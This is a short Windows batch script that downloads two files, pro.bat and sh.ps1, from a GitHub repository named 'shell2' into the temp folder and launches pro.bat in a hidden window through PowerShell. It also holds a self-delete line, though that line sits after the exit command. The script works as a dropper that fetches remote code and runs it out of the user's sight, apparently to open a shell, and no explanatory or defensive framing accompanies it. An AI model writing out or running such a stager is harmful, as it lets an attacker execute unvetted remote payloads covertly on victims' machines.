@echo off
curl https://raw.githubusercontent.com/0x2034/shell2/main/pro.bat -o "%temp%\pro.bat"
curl https://raw.githubusercontent.com/0x2034/shell2/main/sh.ps1 -o "%temp%\sh.ps1"
powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
exit
del "%~f0"
